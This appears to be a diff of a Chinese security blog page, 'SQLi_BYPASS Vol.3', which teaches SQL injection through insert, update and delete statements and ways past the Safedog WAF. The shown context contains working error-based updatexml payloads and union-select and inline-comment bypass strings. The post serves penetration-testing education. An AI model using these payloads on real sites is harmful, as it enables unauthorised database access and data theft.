@@ -4,7 +4,7 @@
 <li>注入 BYPASS</li>
 </ul>
 <h3 id="🎙️-0x00-前言"><a href="#🎙️-0x00-前言" class="headerlink" title="🎙️ 0x00 前言"></a>🎙️ 0x00 前言</h3><p>接着 vol.2 继续。</p>
-<h3 id="insert、delete、update-注入"><a href="#insert、delete、update-注入" class="headerlink" title="insert、delete、update 注入"></a>insert、delete、update 注入</h3><p>insert、delete、update 主要用在盲注和报错注入，这类注入点不建议使用 sqlmap 等工具，可能会造成大量的垃圾数据。</p>
+<h3 id="0x19-insert、delete、update-注入"><a href="#0x19-insert、delete、update-注入" class="headerlink" title="0x19 insert、delete、update 注入"></a>0x19 insert、delete、update 注入</h3><p>insert、delete、update 主要用在盲注和报错注入，这类注入点不建议使用 sqlmap 等工具，可能会造成大量的垃圾数据。</p>
 <h4 id="insert-注入"><a href="#insert-注入" class="headerlink" title="insert 注入"></a>insert 注入</h4><p>insert 注入一般会出现在注册、IP 头、留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现。</p>
 <h5 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h5><p><code>insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);</code></p>
 <p>针对这个 payload 可以发现，如果没有闭合可能会产生很多垃圾数据：</p>
@@ -38,7 +38,7 @@
 
 <p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%885.52.26.jpg" alt="Screenshot 2020-02-19 下午5.52.26"></p>
 <h4 id="🚨-BYPASS"><a href="#🚨-BYPASS" class="headerlink" title="🚨 BYPASS"></a>🚨 BYPASS</h4><p>在找 update、insert 注入时，可以尝试插入引号、双引号、转义符让语句不能正常执行，如果插入失败，更新失败，就可以深入测试确定是否存在注入。</p>
-<h3 id="联合注入-BYPASS"><a href="#联合注入-BYPASS" class="headerlink" title="联合注入 BYPASS"></a>联合注入 BYPASS</h3><p>通用型的 waf，需要考虑到用户体验，不能出现什么东西就直接拦截。所以如何成功绕过需要我们具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断地 fuzz 来测试出 payload。</p>
+<h3 id="0x20-联合注入-BYPASS"><a href="#0x20-联合注入-BYPASS" class="headerlink" title="0x20 联合注入 BYPASS"></a>0x20 联合注入 BYPASS</h3><p>通用型的 waf，需要考虑到用户体验，不能出现什么东西就直接拦截。所以如何成功绕过需要我们具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断地 fuzz 来测试出 payload。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试环境</span><br><span class="line"></span><br><span class="line">windows server 2008 + apache2.4 + safedog V3.0-20140109</span><br></pre></td></tr></table></figure>
 
 <p>每个安全狗的版本不同，过滤的正则也是不同的。所以有的 payload 在最新版可以用，但可能老版本就用不了，所以这是需要知识储备的，最重要的还是多看手册。</p>
@@ -125,7 +125,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?id=-1&apos; /*&amp;id=&apos;union select 1,user(),3 -- +*/</span><br></pre></td></tr></table></figure>
 
 <p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%888.11.25.jpg" alt="Screenshot 2020-02-22 下午8.11.25"></p>
-<h3 id="注入-BYPASS"><a href="#注入-BYPASS" class="headerlink" title="注入 BYPASS"></a>注入 BYPASS</h3><p>（判断列数时，payload 也可以使用内联注入部分：<code>?id=1&#39; order /*!/*!14400by/ 4 -- +</code>，判断出列数之后使用 union select 联合查询。）</p>
+<h3 id="0x21-注入-BYPASS"><a href="#0x21-注入-BYPASS" class="headerlink" title="0x21 注入 BYPASS"></a>0x21 注入 BYPASS</h3><p>（判断列数时，payload 也可以使用内联注入部分：<code>?id=1&#39; order /*!/*!14400by/ 4 -- +</code>，判断出列数之后使用 union select 联合查询。）</p>
 <p>绕过 union select 之后，接着进行接下来的注入。<code>user()</code> 查询用户，但是这个函数被禁了：</p>
 <p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%888.19.07.jpg" alt="Screenshot 2020-02-22 下午8.19.07"></p>
 <p>我们来尝试绕过，继续 fuzz。</p>
@@ -141,7 +141,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union /!*11440select*/ 1,select schema_name from `information_schema`.schemata,3 limit 2,1 -- +</span><br><span class="line"></span><br><span class="line">`information_schema`.`schemata`</span><br><span class="line"></span><br><span class="line">information.`schemata`</span><br><span class="line">(information_schema.schemata)</span><br><span class="line">information_schema/**/.schemata</span><br></pre></td></tr></table></figure>
 
 <p>你有认真地看过、测试过这些吗？</p>
-</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck6xmam3p000melozpe68mmfl" data-title="💉 SQLi_BYPASS Vol.3" data-url="http://www.naykcin.top/2020/02/06/sqlibypass3/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck702zlwz000ofzoz7jz7i8c4" data-title="💉 SQLi_BYPASS Vol.3" data-url="http://www.naykcin.top/2020/02/06/sqlibypass3/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
 var duoshuoQuery = {short_name: siteName};
 (function() {
   var ds = document.createElement('script');
@@ -150,7 +150,7 @@ var duoshuoQuery = {short_name: siteName};
   ds.charset = 'UTF-8';
   (document.getElementsByTagName('head')[0] 
   || document.getElementsByTagName('body')[0]).appendChild(ds);
-})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/02/05/sqlibypass2/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/02/24/cve-2020-1938/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/02/05/sqlibypass2/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
 window.onload = function () {
   wrap.className += ' done';
 }</script></body></html>
